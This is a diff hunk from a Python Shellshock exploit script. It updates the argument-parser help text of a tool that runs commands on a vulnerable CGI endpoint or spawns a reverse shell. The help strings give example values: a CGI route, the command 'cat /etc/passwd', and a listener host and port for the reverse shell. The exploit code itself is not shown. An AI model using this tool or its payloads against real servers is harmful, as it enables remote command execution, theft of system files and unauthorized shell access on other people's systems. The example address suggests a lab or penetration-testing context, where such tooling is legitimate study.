@@ -34,14 +34,14 @@ def exploit(url, route_to_cgi, command, shell, lhost, lport, timeout):
         print("[!] Exploit failed. The server may not be vulnerable to Shellshock.")
 
 def main():
-    parser = argparse.ArgumentParser(description='Shellshock exploit with command execution')
-    parser.add_argument('-u', '--url', required=True, help='Target URL')
-    parser.add_argument('-r', '--route-to-cgi', required=True, help='Route to CGI script')
-    parser.add_argument('-c', '--command', help='Command to execute')
-    parser.add_argument('-s', '--shell', action='store_true', help='Spawn a reverse shell')
-    parser.add_argument('-lh', '--lhost', help='Local host for reverse shell')
-    parser.add_argument('-lp', '--lport', help='Local port for reverse shell')
-    parser.add_argument('-to', '--timeout', type=int, default=10, help='Timeout in seconds for HTTP requests')
+    parser = argparse.ArgumentParser(description='Shellshock exploit with command execution or reverse shell spawn')
+    parser.add_argument('-u', '--url', required=True, help='Target URL (root path), for example: http://example.com')
+    parser.add_argument('-r', '--route-to-cgi', required=True, help='Route to CGI script, for example /cgi-bin/time.sh')
+    parser.add_argument('-c', '--command', help='Command to execute, for example "cat /etc/passwd" USE SINGLE OR DOUBLE QUOTES')
+    parser.add_argument('-s', '--shell', action='store_true', help='Spawn a reverse shell (lhost and lport arguments needed)')
+    parser.add_argument('-lh', '--lhost', help='Local host for reverse shell, for example: 10.10.14.6')
+    parser.add_argument('-lp', '--lport', help='Local port for reverse shell, for example 443')
+    parser.add_argument('-to', '--timeout', type=int, default=10, help='Timeout in seconds for HTTP requests, default is 10')
     args = parser.parse_args()
 
     if args.shell and (not args.lhost or not args.lport):
